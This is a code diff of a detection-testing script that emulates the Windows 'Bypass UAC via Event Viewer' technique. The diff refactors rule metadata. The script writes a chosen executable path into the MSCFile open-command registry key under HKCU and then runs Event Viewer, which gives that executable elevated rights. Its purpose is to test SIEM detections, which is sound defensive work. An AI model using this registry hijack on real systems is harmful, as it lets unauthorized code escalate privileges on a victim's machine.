@@ -13,18 +13,15 @@ import time
 
 from . import common
 
-PLATFORMS = [common.WINDOWS]
-TRIGGERED_RULES = {
-    "SIEM": [
-        {
-            "rule_id": "31b4c719-f2b4-41f6-a9bd-fce93c2eaf62",
-            "rule_name": "Bypass UAC via Event Viewer",
-        }
-    ],
-    "ENDPOINT": [],
-}
-TECHNIQUES = ["T1548"]
-RTA_ID = "1185afa2-49aa-4cca-8702-228d238c0bd5"
+
+RtaMetadata(
+    uuid="1185afa2-49aa-4cca-8702-228d238c0bd5",
+    platforms=["windows"],
+    endpoint=[],
+    siem=[{"rule_id": "31b4c719-f2b4-41f6-a9bd-fce93c2eaf62", "rule_name": "Bypass UAC via Event Viewer"}],
+    techniques=["T1548"],
+)
+
 
 # Default machine value:
 # HKLM\Software\Classes\MSCFile\shell\open\command\(Default)
@@ -37,9 +34,7 @@ def main(target_file=common.get_path("bin", "myapp.exe")):
     common.log("Bypass UAC with %s" % target_file)
 
     common.log("Writing registry key")
-    hkey = winreg.CreateKey(
-        winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command"
-    )
+    hkey = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\MSCFile\\shell\\open\\command")
     winreg.SetValue(hkey, "", winreg.REG_SZ, target_file)
 
     common.log("Running event viewer")
